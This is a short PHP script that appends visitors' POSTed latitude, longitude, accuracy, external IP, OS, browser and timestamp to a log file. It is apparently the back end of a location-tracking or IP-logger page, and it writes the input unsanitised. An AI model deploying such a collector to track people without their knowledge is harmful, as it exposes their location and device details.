<?php
$myfile = fopen("log.txt", "a") or die("Unable to open file!");

$latitude=$_POST["latitude"];
$longitude=$_POST["longitude"];
$accuracy=$_POST["accuracy"];

$externalIP=$_POST["externalIP"];
$os=$_POST["os"];
$browser=$_POST["browser"];
$mobile=$_POST["mobile"];
$cookieEnabled=$_POST["cookieEnabled"];
$timestamp=$_POST["timestamp"];

$sep = ",";
$end = "\n";

fwrite($myfile, strval($latitude));
fwrite($myfile, $sep);
fwrite($myfile, strval($longitude));
fwrite($myfile, $sep);
fwrite($myfile, strval($accuracy));
fwrite($myfile, $sep);
fwrite($myfile, strval($externalIP));
fwrite($myfile, $sep);
fwrite($myfile, strval($os));
fwrite($myfile, $sep);
fwrite($myfile, strval($browser));
fwrite($myfile, $sep);
fwrite($myfile, strval($mobile));
fwrite($myfile, $sep);
fwrite($myfile, strval($cookieEnabled));
fwrite($myfile, $sep);
fwrite($myfile, strval($timestamp));
fwrite($myfile, $end);

fclose($myfile);

?>
